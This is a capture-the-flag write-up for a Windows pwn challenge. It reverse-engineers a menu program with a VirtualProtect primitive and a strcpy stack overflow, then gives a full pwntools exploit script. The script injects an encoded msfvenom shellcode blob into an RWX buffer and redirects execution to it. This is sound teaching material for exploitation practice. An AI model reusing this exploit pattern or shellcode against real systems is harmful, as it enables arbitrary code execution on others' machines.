---
title: Weapon Safety -- Windows Pwn
date: 2023-03-26T05:59:12Z
draft: false
description: pwn challenge from cyber league 2023
tocOpen: true
---

# Weapon Safety

### Initial Analysis

We are provided with a 64-bit windows executable. If we throw it into IDA, we can see that it did not manage to find the `main` function.

However we have the `_start` function and we can easily find this `main` function ourselves by either looking for strings in the program and finding cross references

![](https://i.imgur.com/S0zLGwu.png)

or clicking into the start function and finding the main function (somewhere in the last block), which can be identified by the function call right after 3 arguments are being loaded (r8, rdx, ecx).

![](https://i.imgur.com/Hq93NdL.png)


![](https://i.imgur.com/lWmv6qi.png)


If we look inside the `main` function, we see that our program presents us with a menu.

![](https://i.imgur.com/WUvSXFA.png)

If we look inside option 1, we see that it calls VirtualProtect on an address of our choice.

VirtualProtect essentially allows us to change the permissions on a memory page. This will be useful to us later.

```c
__int64 __fastcall sub_140001390(unsigned int a1)
{
  unsigned int v1; // esi
  const char *v2; // rcx
  DWORD flOldProtect; // [rsp+2Ch] [rbp-14h] BYREF
  LPVOID lpAddress; // [rsp+30h] [rbp-10h] BYREF
  SIZE_T dwSize; // [rsp+38h] [rbp-8h] BYREF
  DWORD flNewProtect[3]; // [rsp+44h] [rbp+4h] BYREF

  if ( a1 )
  {
    v1 = a1;
    v2 = "Safety is already disabled!";
  }
  else
  {
    printf("Enter safety code #1: ");
    scanf("%lld", &lpAddress);
    printf("Enter safety code #2: ");
    scanf("%lld", &dwSize);
    printf("Enter safety code #3: ");
    scanf("%ld", flNewProtect);
    v1 = VirtualProtect(lpAddress, dwSize, flNewProtect[0], &flOldProtect);
    if ( v1 )
      return v1;
    v2 = "Unable to disable safety catch";
  }
  puts(v2);
  return v1;
}
```

Option 2 allows us to allocate a buffer of any size.

```c
          case 2:
            printf("Enter size of ammunition: ");
            scanf("%lld", &Size);
            Buffer = (char *)malloc(Size);
            printf("Ammunition loaded! Please collect it at locker #%lld\n", Buffer);
            break;
```

Finally, option 3 presents us with a buffer overflow vulnerability by allowing us to write **Size** _(determined by option 2)_ amount of bytes into our **Buffer**.

It then copies our buffer into **opt** which is on our stack with a buffer size of 4. (!!! overflow !!!)

```c
          case 3:
            fgets(Buffer, Size, stdin);
            puts("Fire in the hole!");
            strcpy(opt, v17);
```

### Exploit Strategy

Since we have a BOF, we can essentially take control of our instruction pointer. But the question is, where to return to?

Note that option 1 and 2 allows us to allocate a RWX _(readable, writable, executable)_ buffer of a known address.

We can basically write shellcode inside, and then jump to it via our BOF in option 3.

### Exploit Script

Just like all other windows pwn, we have to first find our offset to return address. 

![](https://i.imgur.com/9en9oZq.png)

If you double click on the `opt` variable, we can see in IDA that it is stored at `rbp-0x90`. Since the return address is at `rbp+0x8`, the offset to our return address is **0x98**.

We also need to find the bad bytes _(essentially bytes that will truncate our input)_ for our shellcode. 

https://alomancy.gitbook.io/guides/guides/bof#5.-finding-bad-characters 

We can create our shellcode with msf venom _(refer to website below)_

https://alomancy.gitbook.io/guides/guides/bof#8.-creating-payload

We might need to make some space on stack for decoding

https://alomancy.gitbook.io/guides/guides/bof#9.-nops


Final script: 

```python
from pwn import *

opt = lambda x: p.sendlineafter(b"Select option: ", str(x).encode())

p = process("./weapon_safety.exe")

# allocate buffer of size 2000
opt(2)
p.sendline(b"2000")
p.recvuntil(b"locker #")
addr = p.recvlineS().strip()

# change buffer permissions to RWX
opt(1)
p.sendline(addr.encode())
p.sendline(b'2000')
p.sendline(b'64')

# write shellcode into buffer
opt(3)
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x82\x3b\xdc\x14\x5e"
buf += b"\xac\x63\x94\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x7e\x73\x5f\xf0\xae\x44\xa3\x94\x82"
buf += b"\x3b\x9d\x45\x1f\xfc\x31\xc5\xd4\x73\xed\xc6\x3b"
buf += b"\xe4\xe8\xc6\xe2\x73\x57\x46\x46\xe4\xe8\xc6\xa2"
buf += b"\x73\x57\x66\x0e\xe4\x6c\x23\xc8\x71\x91\x25\x97"
buf += b"\xe4\x52\x54\x2e\x07\xbd\x68\x5c\x80\x43\xd5\x43"
buf += b"\xf2\xd1\x55\x5f\x6d\x81\x79\xd0\x7a\x8d\x5c\xd5"
buf += b"\xfe\x43\x1f\xc0\x07\x94\x15\x8e\x27\xe3\x1c\x82"
buf += b"\x3b\xdc\x5c\xdb\x6c\x17\xf3\xca\x3a\x0c\x44\xd5"
buf += b"\xe4\x7b\xd0\x09\x7b\xfc\x5d\x5f\x7c\x80\xc2\xca"
buf += b"\xc4\x15\x55\xd5\x98\xeb\xdc\x83\xed\x91\x25\x97"
buf += b"\xe4\x52\x54\x2e\x7a\x1d\xdd\x53\xed\x62\x55\xba"
buf += b"\xdb\xa9\xe5\x12\xaf\x2f\xb0\x8a\x7e\xe5\xc5\x2b"
buf += b"\x74\x3b\xd0\x09\x7b\xf8\x5d\x5f\x7c\x05\xd5\x09"
buf += b"\x37\x94\x50\xd5\xec\x7f\xdd\x83\xeb\x9d\x9f\x5a"
buf += b"\x24\x2b\x95\x52\x7a\x84\x55\x06\xf2\x3a\xce\xc3"
buf += b"\x63\x9d\x4d\x1f\xf6\x2b\x17\x6e\x1b\x9d\x46\xa1"
buf += b"\x4c\x3b\xd5\xdb\x61\x94\x9f\x4c\x45\x34\x6b\x7d"
buf += b"\xc4\x81\x5d\xe0\xdb\x10\xa6\xdd\x08\xee\x14\x5e"
buf += b"\xed\x35\xdd\x0b\xdd\x94\x95\xb2\x0c\x62\x94\x82"
buf += b"\x72\x55\xf1\x17\x10\x61\x94\xad\x32\xce\x9f\x57"
buf += b"\x7a\x22\xc0\xcb\xb2\x38\x58\xd7\x5d\x22\x2e\xce"
buf += b"\x4c\xfa\x13\xa1\x79\x2f\x1d\x68\x53\xdd\x15\x5e"
buf += b"\xac\x3a\xd5\x38\x12\x5c\x7f\x5e\x53\xb6\xc4\xd2"
buf += b"\x76\xed\xdd\x13\x9d\xa3\xdc\x7d\xfb\x94\x9d\x9c"
buf += b"\xe4\x9c\x54\xca\xb2\x1d\x55\xe4\x46\x6c\x4b\x62"
buf += b"\xc4\x09\x5c\xd7\x6b\x09\x84\xc3\x63\x90\x9d\xbc"
buf += b"\xe4\xea\x6d\xc3\x81\x45\xb1\x2a\xcd\x9c\x41\xca"
buf += b"\xba\x18\x54\x5c\xac\x63\xdd\x3a\x58\xb1\x70\x5e"
buf += b"\xac\x63\x94\x82\x7a\x8c\x55\x0e\xe4\xea\x76\xd5"
buf += b"\x6c\x8b\x59\x6f\x6c\x09\x99\xdb\x7a\x8c\xf6\xa2"
buf += b"\xca\xa4\xd0\xa6\x6f\xdd\x15\x16\x21\x27\xb0\x9a"
buf += b"\xfd\xdc\x7c\x16\x25\x85\xc2\xd2\x7a\x8c\x55\x0e"
buf += b"\xed\x33\xdd\x7d\xfb\x9d\x44\x17\x53\xab\xd9\x0b"
buf += b"\xfa\x90\x9d\x9f\xed\xd9\xed\x4e\x04\x5a\xeb\x8b"
buf += b"\xe4\x52\x46\xca\xc4\x16\x9f\x50\xed\xd9\x9c\x05"
buf += b"\x26\xbc\xeb\x8b\x17\x93\x21\x20\x6d\x9d\xae\xf8"
buf += b"\x39\xde\x09\x7d\xee\x94\x97\x9a\x84\x5f\x92\xfe"
buf += b"\x31\x5c\xef\xbe\xd9\x66\x2f\xc5\x28\xae\x7b\x34"
buf += b"\xac\x3a\xd5\x0b\xe1\x23\xc1\x5e\xac\x63\x94"


context.arch = "amd64"
payload = b"A"*152
payload += p64(int(addr)+0xa0)
# nop sled
payload += b"\x90"*24
# we need to make space on stack for decoding?
payload += asm("sub rsp, 0x40")
payload += buf

p.sendline(payload)

#pause()
opt(4)


p.interactive()
```
